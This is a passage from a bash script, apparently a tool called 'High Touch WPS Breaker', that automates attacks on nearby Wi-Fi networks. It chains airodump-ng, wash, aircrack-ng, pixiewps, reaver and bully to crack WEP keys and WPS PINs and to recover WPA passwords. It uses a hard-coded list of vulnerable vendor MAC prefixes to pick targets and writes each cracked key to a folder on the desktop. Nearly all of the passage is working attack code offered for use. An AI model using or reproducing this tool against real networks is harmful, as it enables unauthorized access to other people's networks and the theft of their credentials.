						                    Key_ASCII=$(echo -e '\x'$(cat ${Temporary}/aircrack-ng_rslt.txt 2> /dev/null | grep -i "KEY FOUND" | awk '{print $4}' | sed -r 's/:/\\x/g') 2> /dev/null)
						                    Key_HEX=$(cat ${Temporary}/aircrack-ng_rslt.txt 2> /dev/null | grep -i "KEY FOUND" | awk '{print $4}')
						                else
						                	Key=""
						            fi
						            if [ "$Key_ASCII" != "" ]
						            	then
						            	    echo ""
						            	    echo ""
						            	    echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									        echo " [+] Privacy    >> $PRIVACY" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt 
									        echo " [+] Hex Key    >> $Key_HEX" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt 
									        echo " [+] ASCII Key        >> \"${Key_ASCII}\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
											echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
											echo ""
											echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
									        echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
									        echo -e "${White} [+]${Yellow} Privacy    ${Red}>>${Green} $PRIVACY"
									        echo -e "${White} [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
									        echo -e "${White} [+]${Yellow} Hex Key    ${Red}>>${Cyan} $Key_HEX"
									        echo -e "${White} [+]${Yellow} ASCII Key  ${Red}>>${White} \"${Green}${Key_ASCII}${White}\""
											echo -e "${White} [+]${Yellow} Date       ${Red}>>${White} $cr_date"
											echo ""
									        echo -e "$Yellow [+]$Green Congratulation (^_^) "
											echo ""
									else
										    echo ""
										    echo ""
										    echo ""
										    echo -e "$White               [${Red}!${White}]$White Sorry password not found , good luck next time."
											echo ""
									fi
						            kill -9 $Airodump_PID 2> /dev/null
						            kill -9 $arpreplay_PID 2> /dev/null
}
SELECT_CAPTURE_CRACK() {
	                       back=0
						   trap exit_function SIGINT
						   while [ "$back" == "0" ]
						   do
						     clear
							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
						     echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen green$White this mean that device is vulnerable.${Red}                  |"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.${Red}|"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BBlue blue$White this mean that device is already cracked.              ${Red}|"
							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
						     echo -e ${Yellow}"  ID	${BWhite}BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
						     echo -e $Purple" ~~~~   ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
						     i=0
						     while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
								 do
								   v=0
								   length=${#MAC}
		                           PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		                           PRIVACY=${PRIVACY:0:4}
		                           if [ $length -ge 17 ]; then
			                            i=$(($i+1))
										if [ $i != 0 ]; then
										     d=1
										else
										     d=0
									    fi
			                            POWER=`expr $POWER + 100`
			                            CLIENT=`cat ${Temporary}/capture/clients.csv | grep $MAC`
										Ver_vun=`echo $MAC | cut -c 1-8`
			                          	if [ "$CLIENT" != "" ]; then
				                             CLIENT="Yes"
										else
								             CLIENT="No"
			                            fi
			                            if [ "$i" -lt "10" ]
			                            	then
			                            	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
			                            else
			                            	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
			                            fi
										for (( c=0; c<=127; c++))
										    do
											  if [ "$Ver_vun" == "${Vun_MAC[$c]}" ]
											       then
												       v=1
											  fi
									    done
									    if [ $(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
											then
											    echo -e -n $BBlue"$MAC\t"
										elif [ "$v" == 1 ] || [ "$PRIVACY" == "WEP" ]
										    then
											    echo -e -n $BGreen"$MAC\t"
									        else
								    		    echo -e -n $BYellow"$MAC\t"
										fi
										echo -e -n $BWhite"$CHANNEL\t"
										echo -e -n $BWhite"$PRIVACY\t"
										if [ $POWER -ge 40 ]
										     then
										         echo -e -n $Green"$POWER%\t"
										elif [ $POWER -ge 30 ]
										     then
											     echo -e -n $Yellow"$POWER%\t"
										else
										         echo -e -n $Red"$POWER%\t"
										fi
										if [ "$CLIENT" == "Yes" ]
										     then
										         echo -e -n $Green"$CLIENT\t"
										     else
											     echo -e -n $Red"$CLIENT\t"
										fi
										echo -e $BWhite"$ESSID\t"
			                            IDLENGTH=$IDLENGTH
			                            ESSID[$i]=$ESSID
			                            CHANNEL[$i]=$CHANNEL
			                            BSSID[$i]=$MAC
			                            PRIVACY[$i]=$PRIVACY
			                            SPEED[$i]=$SPEED
		                            fi
								 done < ${Temporary}/capture/capture-02.csv
						   echo ""
						   echo ""
						   V_number=0
						   while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -n -e "${White}  [+]$Blue Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
						                      read  N_OB
											  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
											      then
											         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
											  	        then
											                V_number=1
											         else
											                V_number=0
											         fi
											  else
											         V_number=0
											  fi
						   done
						   echo ""
						   idlenght=${IDLENGTH[$N_OB]}
						   ESSID=${ESSID[$N_OB]}
						   CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
						   BSSID=${BSSID[$N_OB]}
						   PRIVACY=${PRIVACY[$N_OB]}
						   SPEED=${SPEED[$N_OB]}
						   ESSID="$(echo $ESSID)"
						   CRACKING_PROCESS
						   done
						   if [ "$back" == "1" ]
						        then
								    re="yes"
						   elif [ "$back" == "2" ]
						        then
								    re="no"
						   fi
}
CRACKING_PROCESS() {
                           Ver_Dir=`ls ${Desktop_PATH} | grep Passwords\ \&\ Pins`
						   if [ "$Ver_Dir" == "" ];then
								mkdir ${Desktop_PATH}/Passwords\ \&\ Pins
						   fi
						   Ver_p=`ls ${Desktop_PATH}/Passwords\ \&\ Pins | grep ${BSSID}`
						   if [ "$Ver_p" != "" ]
								then
									Ver_PIN=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/$BSSID* | grep -i 'pin' | wc -l`
									Ver_KEY=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/$BSSID* | grep -i 'Key' | cut -d'"' -f2`
								else
								    Ver_PIN=0
						   fi
						   if [ "$Ver_p" != "" ] && [ $Ver_PIN -gt 0 ] || [ "$Ver_KEY" != "" ]
								then
								    ESSID=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 1p | cut -c20-`
                                    BSSID=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 2p | cut -c20-`
                                    CHANNEL=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 3p | cut -c20-`
                                    PIN=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 4p | awk -F\" '{print $2}'`
                                    Key=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
                                    time_taken=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 6p | cut -c20-`
                                    cr_date=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 7p | cut -c20-`
									echo ""
									echo -e " ${Red} [${Yellow}+${Red}]$BGreen $BSSID$White is already cracked : "
                                    echo ""
									echo -e "${White}           [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
									echo -e "${White}           [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
									echo -e "${White}           [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
									echo -e "${White}           [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN${White}\""
									echo -e "${White}           [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key${White}\""
									echo -e "${White}           [+]${Yellow} Time Taken ${Red}>>${White} $time_taken"
									echo -e "${White}           [+]${Yellow} Date       ${Red}>>${White} $cr_date"
									v=0
							elif [ "$PRIVACY" == "WEP" ]
								then
								    trap kill_wep_function SIGINT
								    WEP_function
						            trap exit_function SIGINT
						            v=0
								else
                                    echo ""
         						    echo -e "${White} [${Red}!${White}] Wait until$Green the required arguments$White are captured :"
						            echo ""
						            sleep 1
									trap kill_reaver SIGINT
						            arguments
						            trap exit_function SIGINT
						            rm -rf ${Temporary}/empty.txt
									v=1
						   fi
                           if [ "$WPS" == "" ] && [ $v -eq 1 ]
                                then
									 if [ "$e" != "" ] && [ "$r" != "" ] && [ "$s" != "" ] && [ "$z" != "" ] && [ "$a" != "" ] && [ "$n" != "" ] && [ "$m" != "" ]
									      then
                                              if [ "$Ver_PIN" == "0" ]; then
                                              	  trap kill_load SIGINT
                                                  pixiewps -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
												  PID="$!"
												  Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
												  End_Msg="Cracking process is done , the $Green Result$White is as follows :"
                								  Loading
									              PIN=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
									              time_taken=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
									              cr_date=`date`
									              if [ "$PIN" != "" ]
									                   then
									                        echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									                        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									                        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									                        echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									                        echo ""
													        echo -e "${White}       [+] PIN  >>${Green} $PIN"
													        echo -e "${White}       [+] Time taken >>${Red} $time_taken"
															echo ""
													        hash bully 2> /dev/null
															hash_bully="$?"
															if [ $hash_bully -eq 0 ]
															     then
										                             echo ""
										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
											                         echo ""
										                             bully -b $BSSID -c $CHANNEL -B -F -p $PIN -e "$ESSID" $mon > ${Temporary}/Get_Pass.txt 2> /dev/null &
										                             PID="$!"
										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
										                             Loading
										                             Key=`cat ${Temporary}/Get_Pass.txt | grep -w key | awk -F\' '{print $4}'`
													                 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
																 else
																     echo ""
																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
																	 echo ""
																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN > ${Temporary}/Get_Pass.txt &
																	 PID="$!"
																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
																	 Loading
																	 Key=`cat ${Temporary}/Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}'`
																	 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
															fi
															echo " [+] Time Taken >> $time_taken" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
															echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
															echo ""
															echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
									                        echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
									                        echo -e "${White} [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
									                        echo -e "${White} [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN${White}\""
									                        echo -e "${White} [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key${White}\""
									                        echo -e "${White} [+]${Yellow} Time Taken ${Red}>>${White} $time_taken"
															echo -e "${White} [+]${Yellow} Date       ${Red}>>${White} $cr_date"
															echo ""
									                        echo -e "$Yellow [+]$Green Congratulation (^_^) "
													        echo ""
									               else
												       cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
												       echo ""
										               echo -e "$White        [${Red}!${White}]$White Sorry pin not found , good luck next time."
												       echo ""
													   rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt

									               fi
											  fi
									      else
										      echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
											  echo ""
									  fi
                           fi
                           trap exit_function SIGINT
						   echo ""
						   echo ""
						   echo -e "$Yellow       [0]$BWhite Back to list of wireless networks."
						   echo -e "$Yellow       [1]$BWhite Back to main menu."
						   echo -e "$Yellow       [2]$BRed exit."
						   echo ""
						   echo ""
						   back="3"
						   while [ "$back" != "0" ] && [ "$back" != "1" ] && [ "$back" != "2" ] && [ "$back" != "\n" ]
						        do
								  echo -en "\033[1A\033[2K"
						          echo -e -n "$White            [+] Select$BRed one$White thing from the menu :"
						          read back
						   done
}
Vun_MAC[0]="C4:39:3A"
Vun_MAC[1]="62:6B:D3"
Vun_MAC[2]="62:53:D4"
Vun_MAC[3]="62:CB:A8"
Vun_MAC[4]="6A:23:3D"
Vun_MAC[5]="72:23:3D"
Vun_MAC[6]="72:3D:FF"
Vun_MAC[7]="72:55:9C"
Vun_MAC[8]="0C:96:BF"
Vun_MAC[9]="08:7A:4C"
Vun_MAC[10]="20:08:ED"
Vun_MAC[11]="D0:7A:B5"
Vun_MAC[12]="E8:CD:2D"
Vun_MAC[13]="00:A0:26"
Vun_MAC[14]="C8:D3:A3"
Vun_MAC[15]="B2:46:FC"
Vun_MAC[16]="5C:35:3B"
Vun_MAC[17]="DC:53:7C"
Vun_MAC[18]="6C:B0:CE"
Vun_MAC[19]="92:EF:68"
Vun_MAC[20]="18:17:25"
Vun_MAC[21]="A6:B9:EE"
Vun_MAC[22]="00:18:E7"
Vun_MAC[23]="A6:AB:AA"
Vun_MAC[24]="D8:FE:E3"
Vun_MAC[25]="60:E7:01"
Vun_MAC[26]="A6:63:D8"
Vun_MAC[27]="A6:E2:F8"
Vun_MAC[28]="A6:EB:BA"
Vun_MAC[30]="A6:20:88"
Vun_MAC[31]="84:C9:B2"
Vun_MAC[32]="A6:B2:6C"
Vun_MAC[33]="00:11:6B"
Vun_MAC[34]="CE:70:9C"
Vun_MAC[35]="14:B9:68"
Vun_MAC[36]="A6:0C:C3"
Vun_MAC[37]="28:28:5D"
Vun_MAC[38]="A6:3E:CF"
Vun_MAC[39]="A6:44:11"
Vun_MAC[40]="78:54:2E"
Vun_MAC[41]="CE:6E:1B"
Vun_MAC[42]="B0:48:7A"
Vun_MAC[43]="CE:03:00"
Vun_MAC[44]="A6:D5:B5"
Vun_MAC[45]="CE:7F:1F"
Vun_MAC[46]="A6:52:14"
Vun_MAC[47]="C0:4A:00"
Vun_MAC[48]="A6:DE:F7"
Vun_MAC[49]="A6:5D:57"
Vun_MAC[50]="A6:A3:A8"
Vun_MAC[51]="A6:6A:5A"
Vun_MAC[52]="CE:BC:6F"
Vun_MAC[53]="CE:98:66"
Vun_MAC[54]="72:A8:E4"
Vun_MAC[55]="A6:BD:AF"
Vun_MAC[56]="A6:02:C0"
Vun_MAC[57]="80:1F:02"
Vun_MAC[58]="00:23:69"
Vun_MAC[59]="A6:DB:B6"
Vun_MAC[60]="A6:0C:83"
Vun_MAC[61]="A6:8D:E3"
Vun_MAC[62]="A6:78:9E"
Vun_MAC[63]="A6:DA:36"
Vun_MAC[64]="A6:CF:F3"
Vun_MAC[65]="C4:A8:1D"
Vun_MAC[66]="CE:C1:70"
Vun_MAC[67]="A6:01:C0"
Vun_MAC[68]="BC:14:0C"
Vun_MAC[69]="A6:A6:69"
Vun_MAC[70]="CE:31:0C"
Vun_MAC[71]="A6:7B:9E"
Vun_MAC[72]="A6:8E:E3"
Vun_MAC[73]="00:02:6F"
Vun_MAC[74]="00:05:CA"
Vun_MAC[75]="00:22:F7"
Vun_MAC[76]="00:26:5B"
Vun_MAC[77]="58:1F:28"
Vun_MAC[78]="62:7D:5E"
Vun_MAC[79]="62:A8:E4"
Vun_MAC[80]="62:C0:6F"
Vun_MAC[81]="6A:3D:FF"
Vun_MAC[82]="6A:A8:E4"
Vun_MAC[83]="6A:C0:6F"
Vun_MAC[84]="72:C0:6F"
Vun_MAC[85]="72:CB:A8"
Vun_MAC[86]="80:37:73"
Vun_MAC[87]="00:0C:F6"
Vun_MAC[88]="00:14:5C"
Vun_MAC[89]="00:19:15"
Vun_MAC[90]="00:1D:D3"
Vun_MAC[91]="00:1D:D4"
Vun_MAC[92]="00:22:75"
Vun_MAC[93]="00:4F:81"
Vun_MAC[94]="14:CF:E2"
Vun_MAC[95]="20:73:55"
Vun_MAC[96]="24:09:95"
Vun_MAC[97]="62:23:3D"
Vun_MAC[98]="62:55:9C"
Vun_MAC[99]="62:A8:E4"
Vun_MAC[100]="68:A0:F6"
Vun_MAC[101]="68:B6:FC"
Vun_MAC[102]="6A:96:BF"
Vun_MAC[103]="6A:C6:1F"
Vun_MAC[104]="6A:CB:A8"
Vun_MAC[105]="6A:CD:BE"
Vun_MAC[106]="72:6B:D3"
Vun_MAC[107]="72:7D:5E"
Vun_MAC[108]="72:CD:BE"
Vun_MAC[109]="74:DA:38"
Vun_MAC[110]="8C:09:F4"
Vun_MAC[111]="90:0D:CB"
Vun_MAC[112]="90:1A:CA"
Vun_MAC[113]="90:C7:92"
Vun_MAC[114]="AC:B3:13"
Vun_MAC[115]="BC:14:01"
Vun_MAC[116]="E8:3E:FC"
Vun_MAC[117]="E8:ED:05"
Vun_MAC[118]="F4:C7:14"
Vun_MAC[119]="F8:1B:FA"
Vun_MAC[120]="F8:63:94"
Vun_MAC[121]="F8:8B:86"
Vun_MAC[122]="F8:C3:46"
Vun_MAC[125]="80:3F:5D"
Vun_MAC[126]="A6:40:10"
re='Y'
while [ "$re" == 'Y' ] || [ "$re" == 'y' ] || [ "$re" == 'Yes' ] || [ "$re" == 'YES' ] || [ "$re" == 'yes' ] || [ "$re" == 'O' ] || [ "$re" == 'o' ] || [ "$re" == 'Oui' ] || [ "$re" == 'OUI' ] || [ "$re" == 'oui' ]
do
re=nothing
clear
trap - SIGINT SIGQUIT SIGTSTP
echo ""
sleep 0.1
echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+"
sleep 0.1
echo -e $Yellow   "    |                                                                   |"
sleep 0.1
echo -e "     |$Red   ██╗  ██╗████████╗   ${Green}██╗    ██╗██████╗ ███████╗ ${BCyan}██${Yellow}╗${BCyan} ██${Yellow}╗ ${Purple}██████╗ $Yellow |"
sleep 0.1    
echo -e "     |$Red   ██║  ██║╚══██╔══╝   ${Green}██║    ██║██╔══██╗██╔════╝${Red}████████${Yellow}╗${Purple}██╔══██╗$Yellow |"   
sleep 0.1
echo -e "     |$BRed   ███████║   ██║${White}█████╗${BGreen}██║ █╗ ██║██████╔╝███████╗${Yellow}╚${BCyan}██${Yellow}╔═${BCyan}██${Yellow}╔╝${BPurple}██████╔╝$Yellow |"  
sleep 0.1 
echo -e "     |$BRed   ██╔══██║   ██║${White}╚════╝${BGreen}██║███╗██║██╔═══╝ ╚════██${Yellow}║${Red}████████${Yellow}╗${BPurple}██╔══██╗$Yellow |" 
sleep 0.1
echo -e "     |$Red   ██║  ██║   ██║      ${Green}╚███╔███╔╝██║     ███████║${Yellow}╚${BCyan}██${Yellow}╔═${BCyan}██${Yellow}╔╝${Purple}██████╔╝$Yellow |" 
sleep 0.1
echo -e "     |$Red   ╚═╝  ╚═╝   ╚═╝      ${Green} ╚══╝╚══╝ ╚═╝     ╚══════╝${Yellow} ╚═╝ ╚═╝ ${Purple}╚═════╝ $Yellow |"  
sleep 0.1
echo -e "     |                                                                   |"
sleep 0.1
echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+${Yellow}"
sleep 0.1
echo -e "                          |${BRed} High${BYellow} Touch${BPurple} WPS${BGreen} Breaker${Yellow} |"
sleep 0.1
echo -e "                          ${Cyan}+${Yellow}------------------------${Cyan}+"
sleep 0.1
echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
echo -e "${White}     | ${Yellow} ID ${White} |                   ${BPurple}   Name                             ${White}     |"
echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Attack automatically with${Cyan} Wash${White} .        (${Red}WPS${Green}{${Yellow}WPA${White}/${Yellow}WPA2${Green}}${White})    |"
echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Green Attack automatically with${Cyan} Airodump-ng${White} . (${Red}WEP${White}/${Red}WPS${Green}{${Yellow}WPA${White}/${Yellow}WPA2${Green}}${White})|"
echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Manuel input${White} .                                             |"
echo -e "${White}     | ${Red}[${Yellow}04${Red}]${White} |$Green If you want to crack an acces point's key with$BRed WPS PIN${White} .   |"
echo -e "${White}     | ${Red}[${Yellow}05${Red}]${White} |$Green If you want to crack a$BRed Hidden$Green acces point${White} .                |"
echo -e "${White}     | ${Red}[${Yellow}06${Red}]${White} |$Green ${Green}Enable${White} or ${Red}Disable${White} The${Cyan} Monitor Mode${White} .                       |"
echo -e "${White}     | ${Red}[${Yellow}07${Red}]${White} |$Green Exit${White} .${White}                                                     |"
echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
echo ""
echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
read menu
menu=`expr $menu + 0 2> /dev/null`
case $menu in
             "1")
			     Ver_Pckg_Tools
				 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
						   trap kill_wash SIGINT
						   wash -i $mon -C -o ${Temporary}/wash.txt > /dev/null &
						   WashID="$!"
						   disown $WashID
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
								   sleep 1
						   done
						   back=0
						   fin=0
						   num_wireless=-1
						   while [ "$back" == "0" ]
						   do
						     clear
							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
						     echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen green$White this mean that device is vulnerable.${Red}                  |"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.${Red}|"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BRed red$White this mean the wps of that device is Locked.$Red             |"
							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
						     echo -e ${Yellow}"  ID	${BWhite}BSSID                  CH       PWR     WPS Locked   Ver    ESSID"
						     echo -e $Purple" ~~~~   ~~~~~                  ~~       ~~~     ~~~~~~~~~~   ~~~    ~~~~~"
						     i=0
							 Quit=0
							 NL=1
							 count_rot=0
							 while [ $Quit == 0 ]
								 do
								   cat ${Temporary}/wash.txt | sed '1,2d' > ${Temporary}/wash_nf.txt
								   line=`cat ${Temporary}/wash_nf.txt | sed -n ${NL}p 2> /dev/null`
								   if [ "$line" != "" ]
								      then
								   v=0
								   MAC=`echo $line | awk -F' ' '{print $1}'`
								   CHANNEL=`echo $line | awk -F' ' '{print $2}'`
								   POWER=`echo $line | awk -F' ' '{print $3}'`
								   WPS_VERSION=`echo $line | awk -F' ' '{print $4}'`
								   WPS_LOCKED=`echo $line | awk -F' ' '{print $5}'`
								   ESSID=`echo $line | cut -d' ' -f6-`
								   length=${#MAC}
		                           if [ $length -ge 17 ]; then
			                            i=$(($i+1))
										if [ $i != 0 ]; then
										     d=1
										else
										     d=0
									    fi
			                            POWER=`expr $POWER + 100`
										Ver_vun=`echo $MAC | cut -c 1-8`
										if [ "$WPS_LOCKED" == "No" ]
										    then
											    WPS_LOCKED="  No  "
										else
										        WPS_LOCKED="Locked"
										fi
			                            if [ "$i" -lt "10" ]
			                            	then
			                            	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
			                            else
			                            	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
			                            fi
										for (( c=0; c<=66; c++))
										    do
											  if [ "$Ver_vun" == "${Vun_MAC[$c]}" ]
											       then
												       v=1
											  fi
									    done
										if [ "$WPS_LOCKED" == "Locked" ]
										    then
											    echo -e -n $BRed"$MAC\t"
										elif [ "$v" == 1 ]
										    then
											    echo -e -n $BGreen"$MAC      "
									    else
								    		    echo -e -n $BYellow"$MAC      "
										fi
										if [ "$CHANNEL" -ge 10 ]
										    then
										        echo -e -n $BWhite"$CHANNEL\t"
										else
										        echo -e -n $BWhite"0$CHANNEL\t"
										fi
										if [ $POWER -ge 40 ]
										     then
										         echo -e -n $Green"$POWER%\t"
										elif [ $POWER -ge 30 ]
										     then
											     echo -e -n $Yellow"$POWER%\t"
										else
										         echo -e -n $Red"$POWER%\t"
										fi
										if [ "$WPS_LOCKED" == "  No  " ]
										   then
										       echo -e -n $Green"  $WPS_LOCKED"
										else
										       echo -e -n $Red"  $WPS_LOCKED"
									    fi
										echo -e -n $Green"     $WPS_VERSION"
										echo -e $BWhite"    $ESSID\t"
			                            IDLENGTH=$IDLENGTH
			                            ESSID[$i]=$ESSID
			                            CHANNEL[$i]=$CHANNEL
			                            BSSID[$i]=$MAC
			                            SPEED[$i]=$SPEED
		                            fi
									NL=$(($NL+1))
									fi
									sleep 0.1
									if [ "$fin" -eq 1 ]
									   then
									       count_rot=$(($count_rot+1))
									fi
									if [ "$count_rot" -eq "$num_wireless" ]
									    then
										    Quit=1
								    fi
								 done < <( cat ${Temporary}/wash_nf.txt 2> /dev/null )
						   num_wireless=$i
						   fin=1
						   trap exit_function SIGINT
						   echo ""
						   echo ""
						   V_number=0
						   while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -n -e "${White}  [+]$Blue Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
						                      read  N_OB
											  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
											      then
											         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
											  	        then
											                V_number=1
											         else
											                V_number=0
											         fi
											  else
											         V_number=0
											  fi
						   done
						   echo ""
						   idlenght=${IDLENGTH[$N_OB]}
						   ESSID=${ESSID[$N_OB]}
						   CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
						   BSSID=${BSSID[$N_OB]}
						   PRIVACY=${PRIVACY[$N_OB]}
						   SPEED=${SPEED[$N_OB]}
						   ESSID="$(echo $ESSID)"
						   CRACKING_PROCESS
						   done
						   if [ "$back" == "1" ]
						        then
								    re="yes"
						   elif [ "$back" == "2" ]
						        then
								    re="no"
						   fi
                 fi
			     ;;
             "2")
			     Ver_Pckg_Tools
				 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
								   sleep 1
						   done
						   Ver_Dir=`ls ${Temporary} | grep -E '^capture$'`
						   if [ "$Ver_Dir" != "" ];then
	      			            rm -rf ${Temporary}/capture
								mkdir ${Temporary}/capture
						   else
						        mkdir ${Temporary}/capture
     					   fi
						   airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
						   HeTa=`expr $HeTa - 1`
						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
						   SELECT_CAPTURE_CRACK
                 fi
                 ;;
			"3")
			      airmon-ng > ${Temporary}/.airmon-ng.txt
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                  VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                  Ver_Mon_WCar_Fun
                  if [ "$VerMon" != "" ]
                       then
